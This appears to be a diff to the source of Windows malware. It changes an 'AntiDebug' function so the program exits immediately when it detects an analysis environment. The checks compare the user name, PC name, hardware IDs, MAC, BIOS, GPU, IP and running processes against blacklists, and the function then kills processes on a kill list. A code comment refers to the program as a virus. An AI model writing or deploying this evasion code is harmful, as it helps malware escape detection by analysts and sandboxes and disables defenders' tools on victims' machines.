@@ -181,82 +181,81 @@ def checkPlatform():
 
 def AntiDebug(oneStart):  
 
+    print("ad")
     pathf = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
 
     if oneStart:
         if (os.path.exists(rf'{pathf}\system\sysFiles\winDef\log20742384.txt')):# Checks if a virus has opened on this PC
-            return True
+            os._exit(0)
     if os.path.exists(rf'{pathf}\windll'):
-        return True
+        os._exit(0)
 
     processlist = psutil.process_iter(['name'])
 
     if os.getenv("USERPROFILE") in blacklisted_Users:
-        return True
+        os._exit(0)
 
 
     if os.getenv('COMPUTERNAME') in blacklisted_PC_Name:
-        return True
+        os._exit(0)
 
 
     if checkHWID() in blacklisted_HWID:
-        return True
+        os._exit(0)
 
 
     if checkMAC() in blacklisted_Mac_Address:
-        return True
+        os._exit(0)
 
 
     for exe in processlist:
         if exe.info.get('name') in blacklisted_Processes:
-            return True
-            break
+            os._exit(0)
 
     if not os.path.exists(f"{os.getenv('APPDATA')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"):
-        return True
+        os._exit(0)
 
 
     if checkBIOS() in blacklisted_Bios:
-        return True
+        os._exit(0)
 
     
     if checkManufacture() in blacklisted_Manufacture:
-        return True
+        os._exit(0)
 
 
     if checkBASE() in blacklisted_BaseBoard:
-        return True
+        os._exit(0)
 
 
     if checkCPU() in blacklisted_CPU:
-        return True
+        os._exit(0)
 
 
     if checkDrive() in blacklisted_Drive:
-        return True
+        os._exit(0)
 
 
     if checkHW_profile() in blacklisted_HW_Profile_GUID:
-        return True
+        os._exit(0)
  
 
 
     if checkGUID() in blacklisted_Machine_GUID:
-        return True
+        os._exit(0)
 
     gpus = checkGPU()
     for gpu in gpus:
         if gpu in blacklisted_GPU:
-            return True
-            break
+            os._exit(0)
 
 
 
     if checkIP() in blacklisted_ip:
-        return True
+        os._exit(0)
 
     if checkPlatform() in blacklisted_Platform:
-        return True
+        os._exit(0)
     
     for proc in processlist:
             if any(procstr in proc.name().lower() for procstr in kill_Processes):
@@ -264,7 +263,6 @@ def AntiDebug(oneStart):
                     proc.kill()
                 except (psutil.NoSuchProcess, psutil.AccessDenied):
                     pass
-    return False
 
 
 
